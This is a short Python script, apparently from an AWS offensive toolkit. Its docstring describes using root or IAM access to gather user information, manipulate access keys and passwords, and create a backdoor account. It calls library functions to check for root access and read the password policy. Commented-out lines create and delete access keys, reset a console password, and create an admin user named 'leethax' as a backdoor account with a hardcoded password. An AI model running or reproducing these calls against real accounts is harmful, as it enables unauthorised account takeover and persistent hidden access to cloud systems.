'''
if you have root or IAM access gather user info, manipulate access keys or passwords, make backdoor account
'''

import boto3
import botocore

import json
import urllib
import logging
import sys,os
import pprint

pp = pprint.PrettyPrinter(indent=5, width=80)

from libs.iam import *

#insert AWS key, will figure out how to pull this in from a single file for all scripts

#AWS_ACCESS_KEY_ID = ''
#AWS_SECRET_ACCESS_KEY =''



check_root_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
get_password_policy(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY)
#create_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'pythons3')
#delete_access_key(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'pythons3', 'AKIAIJV3RQMOYM7WQS2Q')
#change_user_console_password(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, 'pythons3', 'PS#EDCasd123456!@')
#create_user(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'leethax')
#make_admin(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'leethax')
#make_backdoor_account(AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY,'leethax','PS#EDCasd123456!@')